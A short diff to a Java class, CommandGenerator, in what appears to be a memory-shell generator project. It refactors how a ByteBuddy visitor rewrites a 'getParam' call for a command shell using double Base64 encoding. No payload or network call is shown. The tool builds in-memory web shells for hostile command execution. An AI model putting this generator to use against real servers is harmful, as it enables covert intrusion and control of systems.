@@ -8,13 +8,10 @@ import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
 import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
 import net.bytebuddy.asm.Advice;
-import net.bytebuddy.asm.AsmVisitorWrapper;
 import net.bytebuddy.description.modifier.Ownership;
 import net.bytebuddy.description.modifier.Visibility;
 import net.bytebuddy.dynamic.DynamicType;
 import net.bytebuddy.implementation.FixedValue;
-
-import java.util.Collections;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -43,13 +40,8 @@ public class CommandGenerator extends ByteBuddyShellGenerator<CommandConfig> {
 
         if (CommandConfig.Encryptor.DOUBLE_BASE64.equals(shellToolConfig.getEncryptor())) {
             builder = builder
-                    .visit(new AsmVisitorWrapper.ForDeclaredMethods()
-                            .method(named("getParam"),
-                                    new MethodCallReplaceVisitorWrapper(
-                                            shellToolConfig.getShellClassName(),
-                                            Collections.singleton(ShellCommonUtil.class.getName()))
-                            )
-                    )
+                    .visit(MethodCallReplaceVisitorWrapper.newInstance("getParam",
+                            shellToolConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                     .defineMethod("base64DecodeToString", String.class, Visibility.PUBLIC, Ownership.STATIC)
                     .withParameters(String.class)
                     .throwing(Exception.class)
